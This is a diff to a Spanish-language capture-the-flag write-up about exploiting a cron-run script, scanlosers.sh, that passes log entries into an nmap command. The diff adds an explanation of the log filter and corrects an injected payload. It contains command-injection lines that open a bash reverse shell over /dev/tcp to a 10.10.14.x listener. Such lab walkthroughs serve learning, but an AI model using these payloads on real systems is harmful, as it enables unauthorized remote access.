@@ -132,7 +132,23 @@ Vemos un archivo llamado **scanlosers.sh** que podemos visualizar:
 
 ![[Pasted image 20210518142504.png]]
 
-Vemos que carga el contenido de /home/kid/logs/hackers y ejecuta un comando.
+Vemos que carga el contenido de /home/kid/logs/hackers le aplica un filtro y ejecuta un comando.
+
+**filtro:**
+
+```
+cat $log | cut -d' ' -f3- | sort -u
+
+# si aplicamos esto a cualquier cadena sabremos que hace
+
+echo "hola a todos como estan" | cut -d' ' -f3- | sort -u
+
+#output: todos como estan
+```
+
+Vemos que toma todo desde el tercer valor
+
+**comando:**
 
 ```
 sh -c nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null
@@ -170,7 +186,7 @@ Vemos que se esta ejecutando el mismo comando del archivo **scanlosers.sh**:
 sh -c nmap --top-ports 10 -oN recon/;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.66/4242 0>&1' #.nmap ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.66/4242 0>&1' # 2>&1 >/dev/null
 ```
 
-entonces es una tarea que se ejecuta cada cierto periodo de tiempo. Claro que la relacion con el del script:
+entonces es una tarea que se ejecuta cada cierto periodo de tiempo. Claro que la relacion con el script:
 
 ![[Pasted image 20210518142504.png]]
 
@@ -255,7 +271,7 @@ Si IP fuera nuestra reverse shell, se envía el stderr al stdout y todo eso al /
 Entonces vamos a escribir la reverse shell en el archivo hackers y nos colocamos antes a la escucha en el puerto 4242:
 
 ```
-echo " 127.0.0.1 ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.235/4242 0>&1' #" >> hackers
+echo "argumento1 argumento2 127.0.0.1 ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.235/4242 0>&1' #" >> hackers
 ```
 
 de modo que el comando quedaria asi:
